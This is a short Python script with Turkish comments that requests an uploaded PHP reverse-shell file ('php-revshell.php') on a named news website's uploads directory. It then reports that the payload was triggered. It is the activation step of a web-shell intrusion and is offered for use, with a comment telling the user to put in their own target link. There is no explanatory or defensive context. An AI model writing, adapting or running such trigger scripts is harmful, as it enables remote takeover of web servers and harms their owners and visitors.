import requests

url = "https://yildirimbilisimnews.com/uploads/php-revshell.php"  # ← BURAYI KENDİ SİTE LİNKİN YAP
try:
    r = requests.get(url, timeout=3)
    print("[+] Payload tetiklendi! HTTP kodu:", r.status_code)
except Exception as e:
    print("[-] Hedefe erişilemedi:", e)
